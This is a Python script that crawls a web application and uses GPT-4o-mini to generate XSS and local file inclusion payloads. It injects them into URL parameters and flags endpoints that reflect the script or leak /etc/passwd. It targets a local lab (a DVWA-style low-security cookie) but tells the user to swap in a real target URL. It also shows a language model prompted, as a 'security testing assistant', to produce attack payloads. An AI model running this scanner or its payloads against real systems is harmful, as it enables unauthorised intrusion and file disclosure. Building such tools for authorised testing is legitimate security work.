import requests
from urllib.parse import quote, urljoin, urlparse
from bs4 import BeautifulSoup

# Define the session cookie
COOKIES = {
    "PHPSESSID": "eedba667a9887cfc241055f77510b224",
    "security": "low"
}

# Replace with your actual API key
API_KEY = GET_YOUR_OWN_API

# Define the API endpoint
API_URL = "https://api.openai.com/v1/chat/completions"

# Function to interact with GPT-4o-mini for generating payloads
def test_gpt4o_mini(prompt):
    try:
        # Set headers for authentication and content type
        headers = {
            "Authorization": f"Bearer {API_KEY}",
            "Content-Type": "application/json"
        }

        # Define the payload for the request
        data = {
            "model": "gpt-4o-mini",
            "messages": [
                {"role": "system", "content": "You are a security testing assistant."},
                {"role": "user", "content": prompt}
            ],
            "max_tokens": 100,
            "temperature": 0.7
        }

        # Send POST request to the API
        response = requests.post(API_URL, headers=headers, json=data)

        # Check if the request was successful
        if response.status_code == 200:
            # Parse and return the response
            completion = response.json()["choices"][0]["message"]["content"].strip()
            return completion
        else:
            print(f"Error: {response.status_code} - {response.text}")
            return None
    except Exception as e:
        print(f"An error occurred: {e}")
        return None

# Function to fetch links from a target page using BeautifulSoup
def fetch_links_from_page(base_url):
    try:
        response = requests.get(base_url, cookies=COOKIES)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            # Find all links on the page
            links = [a['href'] for a in soup.find_all('a', href=True)]
            # Filter out non-relative URLs (those starting with 'http', 'www', etc.)
            links = [link if link.startswith('/') else urljoin(base_url, link) for link in links]
            return links
        else:
            print(f"Failed to retrieve the page: {base_url}")
            return []
    except Exception as e:
        print(f"Error fetching page {base_url}: {e}")
        return []

# Function to generate and test XSS payloads
def generate_xss_payloads(base_url, link):
    prompt = f"Generate a list of XSS (Cross-Site Scripting) payloads for testing all parameters in the URL '{link}'. Provide only the payloads."

    payloads = test_gpt4o_mini(prompt)
    if payloads:
        for payload in payloads.splitlines():
            # Clean up payload to ensure proper format (without extra prompt text)
            if '=' in payload:
                payload = payload.split('=')[-1].strip()

            # URL encode the payload to ensure it works correctly in URLs
            encoded_payload = quote(payload)

            # If the link contains a query parameter, append the payload; otherwise, add a new query parameter
            if '?' in link:
                url = f"{base_url}{link}&name={encoded_payload}"  # If there's already a query parameter, append with '&'
            else:
                url = f"{base_url}{link}?name={encoded_payload}"  # Otherwise, start with '?'

            response = requests.get(url, cookies=COOKIES)

            # Check if the payload is reflected in the response
            if payload in response.text:
                # Print result in the desired format
                print(f"Vulnerable endpoint: {url}")
                print(f"XSS Payload: {payload}\n")
                return  # Stop after finding one successful XSS result

        print("No XSS vulnerability found.\n")

# Function to generate and test LFI payloads
def generate_lfi_payloads(base_url, link):
    prompt = f"Generate a list of LFI (Local File Inclusion) payloads for testing all parameters in the URL '{link}'. Provide only the payloads. Each payload must start with a '/'"

    payloads = test_gpt4o_mini(prompt)
    if payloads:
        for payload in payloads.splitlines():
            # Ensure the payload starts with '/'
            if not payload.startswith('/'):
                payload = '/' + payload

            # URL encode the payload to ensure it works correctly in URLs
            encoded_payload = quote(payload)

            # If the link contains a query parameter, append the payload; otherwise, add a new query parameter
            if '?' in link:
                url = f"{base_url}{link}&page={encoded_payload}"  # If there's already a query parameter, append with '&'
            else:
                url = f"{base_url}{link}?page={encoded_payload}"  # Otherwise, start with '?'

            response = requests.get(url, cookies=COOKIES)

            # Check for potential LFI vulnerability (looking for sensitive data)
            if "root:" in response.text or "bin/bash" in response.text or "etc/passwd" in response.text:
                # Print result in the desired format
                print(f"Vulnerable endpoint: {url}")
                print(f"LFI Payload: {payload}\n")
                return  # Stop after finding one successful LFI result

        print("No LFI vulnerability found.\n")

# Main function to run the tests
def run_security_tests(base_url):
    print("[INFO] Starting security tests.")
    
    # Crawl the main page to get all the links
    links = fetch_links_from_page(base_url)
    
    if links:
        # For each link found, generate and test XSS and LFI payloads
        for link in links:
            generate_xss_payloads(base_url, link)
            generate_lfi_payloads(base_url, link)
    else:
        print("[INFO] No links found to test.")
    
    print("[INFO] Security tests complete.")

# Entry point for the script
if __name__ == "__main__":
    base_url = "http://127.0.0.1:8001"  # Replace with the actual target URL
    run_security_tests(base_url)
